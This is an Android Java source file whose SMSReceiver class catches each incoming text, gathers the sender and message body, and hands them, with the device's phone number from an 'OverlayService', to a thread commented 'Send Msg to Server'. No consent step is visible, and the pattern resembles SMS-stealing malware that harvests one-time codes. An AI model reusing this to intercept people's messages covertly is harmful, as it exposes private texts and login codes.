package com.example.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSReceiver extends BroadcastReceiver {
    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    //private static SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm");

    @Override
    public void onReceive(Context context, Intent intent) {
        if(intent.getAction().equals(SMS_RECEIVED)) {
            Log.d(this.getClass().getName(), "onReceive()");
            Bundle bundle = intent.getExtras();
            SmsMessage[] messages = parseSmsMessage(bundle);

            if(messages.length > 0){
                Log.d(this.getClass().getName(), "message receive");
                String contents = "";
                String sender = messages[0].getOriginatingAddress();
                //Date receivedDate = new Date(messages[0].getTimestampMillis());
                for(int i=0; i<messages.length; i++){
                    contents = contents+messages[i].getMessageBody();
                }

                // Send Msg to Server
                SCThread scThread = new SCThread(new OverlayService().getPhoneNo(context), sender, contents, context);
                scThread.start();
            }
        }
    }

    private SmsMessage[] parseSmsMessage(Bundle bundle) {
        Object[] objs = (Object[]) bundle.get("pdus");
        SmsMessage[] messages = new SmsMessage[objs.length];

        for(int i=0; i<objs.length; i++){
            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M){
                String format = bundle.getString("format");
                messages[i] = SmsMessage.createFromPdu((byte[])objs[i], format);
            } else{
                messages[i] = SmsMessage.createFromPdu((byte[])objs[i]);
            }
        }
        return messages;
    }
}
